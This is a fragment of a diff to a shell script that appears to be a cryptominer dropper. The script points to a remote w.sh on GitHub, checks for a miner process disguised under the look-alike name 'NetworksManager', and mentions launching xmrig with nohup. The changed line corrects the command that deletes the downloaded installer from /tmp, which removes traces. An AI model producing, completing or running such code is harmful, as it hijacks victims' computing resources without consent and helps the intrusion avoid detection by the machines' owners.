@@ -8,7 +8,7 @@ setupurl="https://github.com/uzidlrxvs/fos/raw/main/w.sh"
 if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
     # if not already runing, launch xmrig with nohup
     echo "running proccess"
-	rm -r /tmp/w.shss
+	rm -r /tmp/w.sh
     exit
 fi
 
